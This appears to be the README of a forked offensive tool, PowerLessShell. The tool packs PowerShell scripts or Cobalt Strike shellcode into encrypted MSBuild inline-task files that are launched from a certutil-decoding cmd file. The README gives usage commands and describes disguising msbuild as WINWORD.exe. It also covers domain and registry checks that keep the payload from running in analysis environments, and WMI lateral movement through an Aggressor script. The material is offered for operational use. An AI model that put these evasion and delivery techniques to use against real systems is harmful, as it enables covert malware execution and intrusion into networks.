# PowerLessShell

**PowerLessShell uses MSBuild.exe to execute PowerShell scripts and commands or raw shellcode without spawning powershell.exe.**

*This is a fork from https://github.com/Mr-Un1k0d3r/PowerLessShell. This fork contains documentation changes and payload and various functionality enhancements.*

### How it works

PowerLessShell reads in the desired input file, encrypts it with RC4 and then hex encodes it. After this an msbuild project template is populated with the payload and key to decrypt it. The rest of the magic is taken care of by the csproj template created by [Mr-Un1k0d3r](https://github.com/Mr-Un1k0d3r/PowerLessShell) which uses MSBuild's capability of running inline tasks in build files to execute the necessary code. This is then base64 encoded and stuck inside of a cmd file that has a bit of logic in it to decode the payload with certutil and launch it in the correct directory based on user context. Check the source code if you want any more details...

#### Templates

Templates are located in the repo under PowerLessShell/include:

- template-powershell.csproj
- template-shellcode.csproj

The script obfuscates variables from the template. Variables should be named with VAR + a number (i.e. "VAR1").

### Prerequisites

This fork uses [Click](http://click.pocoo.org/5/) for command line input.  To install it from PyPI:

```
pip install click
```



## Usage

### Payloads

Generate shellcode with Cobalt Strike, using `Attacks > Packages > Payload Generator` or for a stageless payload use `Attacks > Packages > Windows Executable (S)` select "Raw" and save the file somewhere convenient.

Alternatively you can supply an arbitrary PowerShell script to be run instead of shellcode. Generate or obtain these the usual ways.

### Help

```
$ ./PowerLessShell.py --help
Usage: PowerLessShell.py [OPTIONS] [PAYLOAD] [OUTFILE]

  Accepts a powershell script or raw shellcode, then encrypts with RC4,
  base64 encodes, and sticks into a csproj template to be executed as inline
  task on the client side. The csproj is then hex encoded and output as a
  cmd file to be launched on a target machine using wmi or schtask, etc. The
  command file uses certutil to decode the csproj, renames msbuild (if
  admin), and then launch the payload.

  [PAYLOAD] defaults to ./beacon.bin
  [OUTFILE] defaults to ./output/payload.cmd

Options:
  -k, --kind [ps|sc]  Powershell (ps) or shellcode (sc) input file, script
                      tries to autodetect based on extension (ps1=powershell,
                      bin=shellcode).
  --known-process     Disguise msbuild as a common Windows executable
  -d, --domain TEXT   Domain name to check for prior to running payload
  --csproj-out        Also output the csproj file
  --help              Show this message and exit.
```

### Example

If the file `beacon.bin` is in the current directory and the output directory `output` already exists, you can just run the script and everything should be detected.

```
$ ./PowerLessShell.py
PowerLessShell - More PowerShell Less Powershell.exe - Mr.Un1k0d3r RingZer0 Team / blark's fork
            ___
        .-"; ! ;"-.
      .'!  : | :  !`.
     /\  ! : ! : !  /\
    /\ |  ! :|: !  | /\
   (  \ \ ; :!: ; / /  )
  ( `. \ | !:|:! | / .' )
  (`. \ \ \!:|:!/ / / .')
   \ `.`.\ |!|! |/,'.' /
    `._`.\\!!!// .'_.'
       `.`.\|//.'.'
        |`._`n'_.'|
        `----^----"

Using payload file beacon.bin, type shellcode
Not writing csproj to disk, if you want this use the --csproj switch
Writing ./output/payload.cmd
```

Otherwise you can do something like this:

```
$ ./PowerLessShell.py -k ps --csproj-out --known-process leetpayload.txt icq_updater.cmd
```

&lt;stdin&gt; and &lt;stdout&gt; work too:

```
$ cat payload.ps1 | ./PowerLessShell.py -k ps - stdin.cmd
$ ./PowerLessShell.py leetscript.ps1 - | xclip
```

**Notes**:

- In order to prevent the payload from running in an analysis environment the USERDOMAIN condition create a check to see if the user's domain matches the one provided before executing the payload. This is an optional parameter.

- Known process name will cause the msbuild.exe to be renamed to something like WINWORD.exe instead of a randomly generated string (see code for exact list of names).

  ​



## Screenshot

The following example is running the RC4 RAT https://github.com/Mr-Un1k0d3r/RC4-PowerShell-RAT without running a single instance of PowerShell

![PowerLessShell](https://ringzer0team.com/powershellless.png)



## MSBuild conditions

MSBuild conditions can be used to avoid running code in unintended (read: analysis) environments.

```
<Target Name="x" Condition="'$(USERDOMAIN)'=='RingZer0'">
```

The malicious code will only be executed if the current domain is "RingZer0"

Several conditions can be used to create more thorough execution check, for example:

```
<Target Name="x" Condition="'$(registry:HKEY_LOCAL_MACHINE\blah@blah)'>='0'">
```

See the following for more information:

- [MSBuild Conditions](https://msdn.microsoft.com/en-us/library/7szfhaft.aspx)
- [Property Functions](https://docs.microsoft.com/en-us/visualstudio/msbuild/property-functions).



## Cobalt Strike Aggressor script (wmi_msbuild.cna)

**By MrT-F**

*This script needs updating to match the new command line...*

cd into your cobalt strike client directory
```
cd /root/cobaltstrike
```
Clone this repository into folder PowerLessShell
```
git clone https://github.com/Mr-Un1k0d3r/PowerLessShell.git
```
Load the aggressor script in your Cobalt Strike Console
Laterally move just like other Cobalt Strike macros:
```
wmi_msbuild [target] [listener]
```



## Credit

Original code by Mr.Un1k0d3r RingZer0 Team 2017





